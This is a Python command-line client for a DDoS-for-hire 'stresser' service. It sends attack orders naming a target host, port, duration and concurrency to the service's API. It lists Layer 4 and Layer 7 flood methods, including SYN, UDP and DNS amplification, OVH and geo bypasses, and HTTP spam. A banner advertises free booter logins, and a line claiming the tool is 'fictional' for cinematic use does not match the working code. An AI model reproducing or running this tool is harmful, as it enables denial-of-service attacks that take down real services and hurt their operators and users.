import aiohttp
import asyncio
import random
from datetime import datetime
from colorama import init, Fore, Style

# Initialize Colorama for terminal colors
init(autoreset=True)

# Set window title
print(f"\033]0;Quantum Stressor X1 - Nightmare Overdrive\007", end="", flush=True)

# Startup message
print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + """
If you don't have a clue how to use a script or any servers, head to 
https://nightmare-stresser.co and we will give you a FREE shared booter 
login for Nightmare Stresser, 100% free! Just make a ticket and mention 
you want the free booter shared account login.
""")

# ASCII Art (Futuristic, cinematic)
ASCII_ART = f"{Fore.LIGHTCYAN_EX}{Style.BRIGHT}\n" \
            f"  ╔════════════════════════════════════════════╗\n" \
            f"  ║         Quantum Stressor X1                ║\n" \
            f"  ║     Nightmare Overdrive - Classified       ║\n" \
            f"  ║  Developed by:   nightmare-stresser.co     ║\n" \
            f"  ║  Quantum-Powered Network Stress Suite      ║\n" \
            f"  ╚════════════════════════════════════════════╝\n"

# Store active attacks
active_attacks = []

# Send HTTP GET request to API
async def send_api_request(url: str) -> str:
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    print(Fore.GREEN + f"Response: {await response.text()}")
                    return "sent"
                else:
                    print(Fore.RED + f"API Error: Status {response.status}")
                    return "failed"
        except aiohttp.ClientError as e:
            print(Fore.RED + f"Network Error: {str(e)}")
            return "failed"

# API interaction for sending attacks
async def send_attack(api_key: str, method: str, host: str, port: int, time: float, concurrents: int = 1):
    url = f"https://api.nightmare-stresser.com/?key={api_key}&method={method}&host={host}&port={port}&time={time}&concurrents={concurrents}"
    print(Fore.YELLOW + f"Sending request to {url}...")
    result = await send_api_request(url)
    if result == "sent":
        # Track the attack
        active_attacks.append({
            "method": method,
            "host": host,
            "port": port,
            "time": time,
            "concurrents": concurrents,
            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
    return result

# API interaction for stopping attacks
async def stop_attack(api_key: str, host: str, port: int, time: float, concurrents: int = 1):
    url = f"https://api.nightmare-stresser.com/?key={api_key}&method=STOP&host={host}&port={port}&time={time}&concurrents={concurrents}"
    print(Fore.YELLOW + f"Sending stop request to {url}...")
    result = await send_api_request(url)
    if result == "sent":
        # Remove the attack from active list
        active_attacks[:] = [attack for attack in active_attacks if not (
            attack["host"] == host and attack["port"] == port and attack["time"] == time
        )]
    return result

# API interaction for stopping all attacks
async def stop_all_attacks(api_key: str):
    url = f"https://api.nightmare-stresser.com/?key={api_key}&method=STOPALL"
    print(Fore.YELLOW + f"Sending stop all request to {url}...")
    result = await send_api_request(url)
    if result == "sent":
        active_attacks.clear()
    return result

# Validation Function
def validate_input(prompt: str, min_val: float, max_val: float, input_type=float) -> float:
    while True:
        try:
            value = input_type(input(Fore.LIGHTCYAN_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"Value must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "Invalid input! Numbers only.")

# Credits Function
def show_credits():
    print(Fore.LIGHTCYAN_EX + "\n" + "═"*50)
    print(Fore.LIGHTCYAN_EX + "        Quantum Stressor X1 Credits")
    print(Fore.LIGHTCYAN_EX + "═"*50)
    print(Fore.LIGHTCYAN_EX + "Developed by: https://nightmare-stresser.co")
    print(Fore.LIGHTCYAN_EX + "Purpose: Simulated quantum network stress testing")
    print(Fore.LIGHTCYAN_EX + "Features: Layer 4 & 7 Quantum Attacks via Nightmare API")
    print(Fore.LIGHTCYAN_EX + "Legal Note: Fictional tool for cinematic use only")
    print(Fore.LIGHTCYAN_EX + "═"*50 + "\n")

# Show active attacks and select one to stop
async def select_attack_to_stop(api_key: str):
    if not active_attacks:
        print(Fore.RED + "No active attacks running!")
        return
    print(Fore.LIGHTCYAN_EX + "\nActive Attacks:")
    for i, attack in enumerate(active_attacks, 1):
        print(f"  {i}. Method: {attack['method']}, Host: {attack['host']}, Port: {attack['port']}, "
              f"Time: {attack['time']}s, Concurrents: {attack['concurrents']}, Started: {attack['start_time']}")
    choice = input(Fore.LIGHTCYAN_EX + f"Select attack to stop (1-{len(active_attacks)}): ").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(active_attacks):
        attack = active_attacks[int(choice) - 1]
        await stop_attack(api_key, attack["host"], attack["port"], attack["time"], attack["concurrents"])
    else:
        print(Fore.RED + "Invalid selection!")

# Main Menu
async def main():
    api_key = input(Fore.LIGHTCYAN_EX + "Enter Nightmare Stresser API Key: ")
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(ASCII_ART)
    print(Fore.LIGHTCYAN_EX + f"API Key Authenticated: {api_key[:4]}****")
    print(Fore.LIGHTCYAN_EX + f"System Time: {current_time}\n")

    layer4_methods = [
        "DNS", "ACK", "GAME-FIVEM", "GAME-SOURCE", "UDP-MIX", "MINECRAFT",
        "TCP-AMP", "TCP-GEO-BYPASS", "UDP-BYPASS", "TCP-SYN", "DNS-R",
        "TCP-RAND", "TCP-OVH", "REVERSE-REFLECTION", "SYN-ACK",
        "TCP-BYPASSv1", "TCP-BYPASSv2", "UDP-GEO-BYPASS"
    ]
    layer7_methods = [
        "AUTO-BYPASS", "BYPASSv2", "SOCKET-SPAM", "HTTP-SPAMMER",
        "AUTO-BYPASSv2", "TOR"
    ]

    while True:
        print(Fore.LIGHTCYAN_EX + "Quantum Modules:")
        print("  1. Layer 4 Attacks")
        print("  2. Layer 7 Attacks")
        print("  3. Stop Attack")
        print("  4. Stop All Attacks")
        print("  5. Credits")
        print("  0. Exit Quantum Matrix")
        category = input(Fore.LIGHTCYAN_EX + "Select module (0-5): ").strip()

        if category == "0":
            print(Fore.RED + "Shutting down Quantum Matrix...")
            break
        elif category == "1":
            print(Fore.LIGHTCYAN_EX + "\nLayer 4 Attacks:")
            for i, method in enumerate(layer4_methods, 1):
                print(f"  {i}. {method}")
            method_idx = input(Fore.LIGHTCYAN_EX + "Select attack (1-18): ").strip()
            if method_idx.isdigit() and 1 <= int(method_idx) <= len(layer4_methods):
                method = layer4_methods[int(method_idx) - 1]
                host = input(Fore.LIGHTCYAN_EX + "Enter target IP: ")
                port = validate_input("Enter port (1-65535): ", 1, 65535)
                time = validate_input("Enter duration (seconds): ", 1, 3600)
                concurrents = validate_input("Enter concurrents (1-100): ", 1, 100, int)
                await send_attack(api_key, method, host, port, time, concurrents)
            else:
                print(Fore.RED + "Invalid attack!")
        elif category == "2":
            print(Fore.LIGHTCYAN_EX + "\nLayer 7 Attacks:")
            for i, method in enumerate(layer7_methods, 1):
                print(f"  {i}. {method}")
            method_idx = input(Fore.LIGHTCYAN_EX + "Select attack (1-6): ").strip()
            if method_idx.isdigit() and 1 <= int(method_idx) <= len(layer7_methods):
                method = layer7_methods[int(method_idx) - 1]
                host = input(Fore.LIGHTCYAN_EX + "Enter target IP or domain: ")
                port = 80 if method in ["HTTP-SPAMMER", "AUTO-BYPASS", "AUTO-BYPASSv2", "TOR"] else validate_input("Enter port (1-65535): ", 1, 65535)
                time = validate_input("Enter duration (seconds): ", 1, 3600)
                concurrents = validate_input("Enter concurrents (1-100): ", 1, 100, int)
                await send_attack(api_key, method, host, port, time, concurrents)
            else:
                print(Fore.RED + "Invalid attack!")
        elif category == "3":
            await select_attack_to_stop(api_key)
        elif category == "4":
            await stop_all_attacks(api_key)
        elif category == "5":
            show_credits()
        else:
            print(Fore.RED + "Invalid module!")

if __name__ == "__main__":
    asyncio.run(main())
